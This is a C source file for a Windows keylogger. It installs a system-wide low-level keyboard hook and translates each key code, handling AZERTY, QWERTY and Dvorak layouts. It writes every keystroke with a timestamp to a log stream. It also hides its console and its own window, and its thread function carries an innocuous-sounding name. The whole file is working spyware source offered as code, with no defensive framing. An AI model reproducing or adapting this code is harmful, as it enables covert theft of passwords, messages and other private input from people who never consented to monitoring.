#include "keylogger.h"

bool shift, caps, ctrl, alt;
int keysPressed;
HHOOK h_keyboard_hookook;
extern FILE * keylogger_output_stream;
HWND keylogger_handle_window;

/*
Keylogger function
*/

// Hook procedure to intercept the keyboard
LRESULT CALLBACK hook_keylogger(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT *hooked_key = (KBDLLHOOKSTRUCT *)lParam;
	SYSTEMTIME LocalTime = { 0 };
	char *str = "[X]";

	if ((nCode >= HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP)))
	{
		if ((wParam == WM_KEYUP) || (wParam == WM_SYSKEYUP)) {
			str = translate(hooked_key->vkCode, true);
		}
		else if ((wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN)) {
			str = translate(hooked_key->vkCode, false);
		}
		if (str) {
			GetLocalTime(&LocalTime);
			fprintf(keylogger_output_stream, "%04d%02d%02d-%02d%02d%02d \'%s\'\n", LocalTime.wYear, LocalTime.wMonth, LocalTime.wDay, LocalTime.wHour, LocalTime.wMinute, LocalTime.wSecond, str);
			keysPressed++;
		}
		// flush file every KEYLOGGER_BUF_SIZE pressed key
		if (keysPressed >= KEYLOGGER_BUF_SIZE) {
			fflush(keylogger_output_stream);
			keysPressed = 0;
		}
	}
	return CallNextHookEx(h_keyboard_hookook, nCode, wParam, lParam);
}

DWORD GetLocalKeyboardLayout(void)
{
	DWORD LocaleIdentifier = 0;
	char KeyboardLayoutName[9];

	GetKeyboardLayoutName(KeyboardLayoutName);
	return atol(KeyboardLayoutName);
}

// funtion that translate pressed key to an understandable data
char * translate(int vk, bool up)
{
	BYTE internal_layout = 0;
	static HKL hkl;
	static DWORD _layout1, _layout2;

	_layout1 = GetLocalKeyboardLayout();

	switch (_layout1) {
	case 0x0000040C:
	case 0x0000080C:
	case 0x00000028: // FR why ?
		internal_layout = Azerty; break;
	case 0x00000407:
	case 0x00000807:
		internal_layout = Qwerty; break;
	case 0x00010409:
		internal_layout = Dvorak; break;
	default:
		internal_layout = Qwerty;
	}

	if (_layout1 != _layout2) {
		fprintf(keylogger_output_stream, "*** Changing Layout from 0x%08X to 0x%08X (%02d)\n", _layout2, _layout1, internal_layout);
		_layout2 = _layout1;
	}

	// VK list : https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
	// and https://msdn.microsoft.com/en-us/library/ms927178.aspx

	char *buf = (char*)malloc(KEYLOGGER_BUF_SIZE + 1);
	memset(buf, 0, KEYLOGGER_BUF_SIZE + 1);

	if (up) {
		DEBUGMSGF("[VK=0x%02X UP]\n", vk);
		switch (vk) {
		case VK_SHIFT:
		case VK_LSHIFT:
		case VK_RSHIFT:
			shift = false;
			strncpy(buf, "[SHIFT Up]", KEYLOGGER_BUF_SIZE);
			break;
		case VK_CONTROL:
		case VK_LCONTROL:
		case VK_RCONTROL:
			ctrl = false;
			strncpy(buf, "[CTRL Up]", KEYLOGGER_BUF_SIZE);
			break;
		case VK_MENU:
			alt = false;
			strncpy(buf, "[ALT Up]", KEYLOGGER_BUF_SIZE);
			break;
		case VK_LMENU:
			alt = false;
			strncpy(buf, "[LMENU Up]", KEYLOGGER_BUF_SIZE);
			break;
		case VK_RMENU:
			alt = false;
			strncpy(buf, "[RMENU Up]", KEYLOGGER_BUF_SIZE);
			break;
		case VK_LWIN:
		case VK_RWIN:
			strncpy(buf, "[WIN Up]", KEYLOGGER_BUF_SIZE);
			break;
		default:
			buf[0] = 0x00;
		};
		if (buf[0] != 0x00)
			return buf;
		else
			return NULL;
	}
	else {
		DEBUGMSGF("[VK=0x%02X DOWN]\n", vk);
		switch (vk) {
		case VK_SHIFT:
		case VK_LSHIFT:
		case VK_RSHIFT:
			shift = true;
			strncpy(buf, "[SHIFT Down]", KEYLOGGER_BUF_SIZE);
			break;
		case VK_CONTROL:
		case VK_LCONTROL:
		case VK_RCONTROL:
			ctrl = true;
			strncpy(buf, "[CTRL Down]", KEYLOGGER_BUF_SIZE);
			break;
		case VK_MENU:
			alt = true;
			strncpy(buf, "[ALT Down]", KEYLOGGER_BUF_SIZE);
			break;
		case VK_LMENU:
			alt = true;
			strncpy(buf, "[LMENU Down]", KEYLOGGER_BUF_SIZE);
			break;
		case VK_RMENU:
			alt = true;
			strncpy(buf, "[RMENU Down]", KEYLOGGER_BUF_SIZE);
			break;
		case VK_LWIN:
		case VK_RWIN:
			strncpy(buf, "[WIN Down]", KEYLOGGER_BUF_SIZE);
			break;
		}
	}
	if (buf[0] != 0x00)
		return buf;

	// Special Keys
	if (vk <= VK_DOWN) {
		switch (vk) {
		case VK_BACK: strncpy(buf, "[BS]", KEYLOGGER_BUF_SIZE); break;
		case VK_TAB: strncpy(buf, "[TAB]", KEYLOGGER_BUF_SIZE); break;
		case VK_RETURN: strncpy(buf, "[CR]", KEYLOGGER_BUF_SIZE); break;
		case VK_CAPITAL: caps ^= 1; break;
		case VK_ESCAPE: strncpy(buf, "[ESC]", KEYLOGGER_BUF_SIZE); break;
		case VK_SPACE: strncpy(buf, "[SPACE]", KEYLOGGER_BUF_SIZE); break;
		case VK_PRIOR: strncpy(buf, "[PRIOR]", KEYLOGGER_BUF_SIZE); break;
		case VK_NEXT: strncpy(buf, "[NEXT]", KEYLOGGER_BUF_SIZE); break;
		case VK_END: strncpy(buf, "[END]", KEYLOGGER_BUF_SIZE); break;
		case VK_HOME: strncpy(buf, "[HOME]", KEYLOGGER_BUF_SIZE); break;
		case VK_LEFT: strncpy(buf, "[LT]", KEYLOGGER_BUF_SIZE); break;
		case VK_UP: strncpy(buf, "[UP]", KEYLOGGER_BUF_SIZE); break;
		case VK_RIGHT: strncpy(buf, "[RT]", KEYLOGGER_BUF_SIZE); break;
		case VK_DOWN: strncpy(buf, "[DN]", KEYLOGGER_BUF_SIZE); break;
		}
		return buf;
	}
	// NumPad numbers
	if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
		buf[0] = (char)(vk - 0x30);
	}
	// Numpad operators
	else if (vk >= VK_MULTIPLY && vk <= VK_DIVIDE) {
		buf[0] = (char)(vk - 0x40);
	}
	// Function keys
	else if (vk >= VK_F1 && vk <= VK_F24) {
		if (shift) { sprintf(buf, "[SF%d]", vk - (VK_F1 - 1)); }
		else { sprintf(buf, "[F%d]", vk - (VK_F1 - 1)); }
	}
	// Alphabetical keys
	else if (isalpha(vk)) {
		if (!caps)
			if (shift) { buf[0] = (char)(toupper(vk)); }
			else { buf[0] = (char)(tolower(vk)); }
		else
			if (!shift) { buf[0] = (char)(toupper(vk)); }
			else { buf[0] = (char)(tolower(vk)); }
	}
	// NUMLOCK or SCROLL
	else if (vk == VK_NUMLOCK || vk == VK_SCROLL) {
		if (vk == VK_NUMLOCK) {
			strncpy(buf, "[NUM_LOCK]", KEYLOGGER_BUF_SIZE);
		}
		else {
			strncpy(buf, "[SCROLL_LOCK]", KEYLOGGER_BUF_SIZE);
		}
	} // All special key
	else if (vk >= VK_BROWSER_BACK && vk <= VK_LAUNCH_APP2) {
		switch (vk) {
		case VK_BROWSER_BACK: strncpy(buf, "[BROWSER_BACK]", KEYLOGGER_BUF_SIZE); break;
		case VK_BROWSER_FORWARD: strncpy(buf, "[BROWSER_FORWARD]", KEYLOGGER_BUF_SIZE); break;
		case VK_BROWSER_REFRESH: strncpy(buf, "[BROWSER_REFRESH]", KEYLOGGER_BUF_SIZE); break;
		case VK_BROWSER_STOP: strncpy(buf, "[BROWSER_STOP]", KEYLOGGER_BUF_SIZE); break;
		case VK_BROWSER_SEARCH: strncpy(buf, "[BROWSER_SEARCH]", KEYLOGGER_BUF_SIZE); break;
		case VK_BROWSER_FAVORITES: strncpy(buf, "[BROWSER_FAVORITES]", KEYLOGGER_BUF_SIZE); break;
		case VK_BROWSER_HOME: strncpy(buf, "[BROWSER_HOME]", KEYLOGGER_BUF_SIZE); break;
		case VK_VOLUME_MUTE: strncpy(buf, "[VOLUME_MUTE]", KEYLOGGER_BUF_SIZE); break;
		case VK_VOLUME_DOWN: strncpy(buf, "[VOLUME_DOWN]", KEYLOGGER_BUF_SIZE); break;
		case VK_VOLUME_UP: strncpy(buf, "[VOLUME_UP]", KEYLOGGER_BUF_SIZE); break;
		case VK_MEDIA_NEXT_TRACK: strncpy(buf, "[MEDIA_NEXT_TRACK]", KEYLOGGER_BUF_SIZE); break;
		case VK_MEDIA_PREV_TRACK: strncpy(buf, "[MEDIA_PREV_TRACK]", KEYLOGGER_BUF_SIZE); break;
		case VK_MEDIA_STOP: strncpy(buf, "[MEDIA_STOP]", KEYLOGGER_BUF_SIZE); break;
		case VK_MEDIA_PLAY_PAUSE: strncpy(buf, "[MEDIA_PLAY_PAUSE]", KEYLOGGER_BUF_SIZE); break;
		case VK_LAUNCH_MAIL: strncpy(buf, "[LAUNCH_MAIL]", KEYLOGGER_BUF_SIZE); break;
		case VK_LAUNCH_MEDIA_SELECT: strncpy(buf, "[LAUNCH_MEDIA_SELECT]", KEYLOGGER_BUF_SIZE); break;
		case VK_LAUNCH_APP1: strncpy(buf, "[LAUNCH_APP1]", KEYLOGGER_BUF_SIZE); break;
		case VK_LAUNCH_APP2: strncpy(buf, "[LAUNCH_APP2]", KEYLOGGER_BUF_SIZE); break;
		}
		return buf;
	}
	else
	{
		bool vk_translated = false;
		int i;
		DEBUGMSGF("Check if %02X", vk);
		for (i = 0; (i < SizeOfIndexKeyLayout) && (vk_translated == false); i++)
		{
			DEBUGMSGF(" == %02X\n", IndexKeyLayout[internal_layout][i]);
			if (vk == IndexKeyLayout[internal_layout][i]) {
				//snprintf(buf, 1, "%c", TabKeyLayout[internal_layout][shift][i]);
				buf[0] = (char)TabKeyLayout[internal_layout][shift][i];
				DEBUGMSGF("Founded! => '%s'\n", TabKeyLayout[internal_layout][shift][i])
					vk_translated = true;
			}
		}

		if (vk_translated == false) {
			sprintf(buf, "[VK=0x%04X]", vk);
			DEBUGMSGF("VK (0x%02X) not in my dictionnary\n", vk);
		}
	}
	return buf;
}

// thread of the keylogger
DWORD WINAPI WinAPIextentionK(LPVOID param)
{
	int keysPressed = 0;

	// we hope ... :-)
	shift = false;
	caps = false;
	ctrl = false;
	alt = false;

	KEYLOG keylog = *((KEYLOG *)param);
	KEYLOG *keylogs = (KEYLOG *)param;
	HINSTANCE hook_instance;

	HWND self = GetConsoleWindow();
	ShowWindow(self, SW_HIDE);

	hook_instance = GetModuleHandle(NULL);
	HOOKPROC hook_procedure = hook_keylogger;

	//keylogger_output_stream = keylog.outputfile_stream;

	// 0 for dwThreadId = associated with all existing threads running in the same desktop as the calling thread
	h_keyboard_hookook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_procedure, hook_instance, 0);

	// Create a windows for this thread
	keylogger_handle_window = CreateWindow("WINDOW", "Win32 Window Application", WS_OVERLAPPEDWINDOW | WS_VISIBLE, \
		0, 0, 0, 0, \
		NULL, NULL, hook_instance, NULL);
	ShowWindow(keylogger_handle_window, SW_HIDE);

	MSG message;
	while ((GetMessage(&message, NULL, 0, 0) != 0) && (keylogs->state == true))
	{
		ShowWindow(self, SW_HIDE);
		ShowWindow(keylogger_handle_window, SW_HIDE);
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(h_keyboard_hookook);
	fprintf(keylogger_output_stream, "\n");
	fflush(keylogger_output_stream);
	fclose(keylogger_output_stream);

	ExitThread(0);
}